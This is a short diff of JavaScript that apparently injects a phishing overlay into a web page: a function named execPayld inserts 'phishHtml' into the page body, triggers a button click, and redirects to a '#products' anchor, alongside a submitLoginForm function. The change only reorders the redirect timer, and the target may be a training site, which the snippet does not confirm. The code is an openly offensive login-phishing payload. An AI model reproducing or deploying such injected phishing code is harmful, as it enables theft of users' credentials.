@@ -77,10 +77,6 @@ async function submitLoginForm() {
   window.open(redirURL, '_self');
 }
 function execPayld() {
-  setTimeout(() => {
-    window.location.href = window.location.href.split('#')[0] + '#products';
-  },
-  1000);
   let phishDiv = document.createElement('div');
   phishDiv.innerHTML = phishHtml;
   document.getElementsByTagName('body')[0].appendChild(phishDiv);
@@ -89,6 +85,10 @@ function execPayld() {
     document.getElementById('okbutton').click();
     event.preventDefault();
   });
+  setTimeout(() => {
+    window.location.href = window.location.href.split('#')[0] + '#products';
+  },
+  1000);
 }
 function checkDOM() {
   var popupElements1 = document.getElementsByClassName('cdk-overlay-container');
